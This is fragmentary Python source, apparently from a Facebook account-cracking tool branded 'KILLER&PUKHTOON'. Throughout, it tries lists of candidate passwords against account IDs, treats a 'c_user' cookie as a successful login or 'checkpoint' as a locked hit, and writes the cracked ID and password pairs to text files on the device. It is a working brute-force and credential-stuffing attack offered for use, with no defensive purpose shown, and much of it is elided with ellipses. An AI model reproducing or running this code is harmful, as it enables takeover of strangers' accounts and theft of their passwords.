...
\33[1;37m----------------------------------------------
→   Owner      :  KILLER&PUKHTOON 
→   Facebook   :  кїггєя Ԁєѵїг 
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/Boo-Boo.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;31m[Notice] '+cid+' | '+ps+'\033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r\x1b[1;37m[KILLER] %s|%s| \x1b[1;92mOK:%s   \r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\x1b[1;97m[KILLER] %s| \033[1;32m OK:%s\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in RIAZ:
                                ...
                                print('\r\r\033[1;32m[KILLER] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;31m[KILLER-CP] '+ids+' | '+pas+'\033[1;97m')
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in RIAZ:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m[PAKTHOON-OK] %s | %s'%(ids,pas))
                                open('/sdcard/PAKTHOON-OK.txt', 'a').write(ids+'|'+pas+'\n')                                
                                oks.append(ids)
                                
                                break
                        elif 'checkpoint' in RIAZ:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;31m[PAKTHOON-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/CP-PAKTHOON-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\033[1;92m[KILLER-OK] '+uid+' | '+ps+'\033[1;32m')
				open('KILLER-ok.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(uid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[PAKTHOON-CP] '+uid+' | '+ps+'\33[0;97m')
				open('PAKTHOON-cp.txt', 'a').write(uid+' | '+ps+'\n')
				cps.append(uid)
				break
			else:
				continue
